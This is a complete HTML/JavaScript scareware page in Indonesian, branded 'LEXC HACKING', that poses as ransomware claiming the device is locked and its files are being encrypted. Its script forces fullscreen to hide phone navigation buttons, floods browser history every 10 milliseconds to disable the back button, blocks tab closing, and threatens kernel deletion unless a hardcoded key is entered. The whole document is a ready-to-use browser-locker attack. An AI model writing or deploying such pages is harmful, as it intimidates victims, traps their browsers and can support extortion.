<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SISTEM CRITICAL - LEXC HACKING</title>
    <style>
        body { background:#000; color:#f00; font-family:monospace; height:100vh; margin:0; overflow:hidden; display:flex; justify-content:center; align-items:center; flex-direction:column; user-select:none; }
        .box { border:2px solid #f00; padding:20px; text-align:center; background:rgba(30,0,0,0.9); box-shadow:0 0 30px #f00; width:80%; }
        input { background:#111; border:1px solid #f00; color:#f00; padding:10px; width:80%; margin:10px 0; text-align:center; font-size:18px; }
        button { background:#f00; color:#000; border:none; padding:10px 20px; font-weight:bold; width:85%; cursor:pointer; }
        #status { font-size:10px; margin-top:10px; }
    </style>
</head>
<body onclick="forceStart()">
    <div class="box">
        <h1 style="animation: blink 0.5s infinite">SYSTEM LOCKED</h1>
        <p>PERANGKAT TELAH DIKUASAI LEXC HACKING</p>
        <p>MASUKKAN KUNCI UNTUK MEMBUKA:</p>
        <input type="password" id="key" placeholder="*****">
        <button onclick="checkKey()">UNLOCK DEVICE</button>
        <div id="status">ENCRYPTING_FILES... 98%</div>
    </div>

    <script>
        const PASS = "MAMAZ2026"; // Kunci VVIP lu

        function forceStart() {
            // Paksa Fullscreen biar tombol navigasi HP sembunyi!
            let el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
            
            // Spam history sebrutal mungkin tiap 10 milidetik
            setInterval(() => {
                history.pushState(null, null, location.href);
            }, 10);
        }

        function checkKey() {
            if (document.getElementById("key").value === PASS) {
                alert("AKSES DITERIMA. MENGEMBALIKAN SISTEM...");
                window.location.href = "https://www.google.com"; // Mental keluar
            } else {
                alert("KUNCI SALAH! KERNEL AKAN DIHAPUS!");
                // Bikin browser lag kalo salah
                for(let i=0; i<1000; i++) { console.log("FREEZING..."); }
            }
        }

        // Blokir tombol Back secara paksa
        window.onpopstate = function() {
            history.pushState(null, null, location.href);
            alert("PERINGATAN: JANGAN MENCOBA KELUAR ATAU HP CRASH!");
        };

        // Cegah tutup tab (berfungsi di beberapa browser)
        window.onbeforeunload = function() {
            return "SISTEM SEDANG DIKUNCI!";
        };
    </script>
</body>
</html>
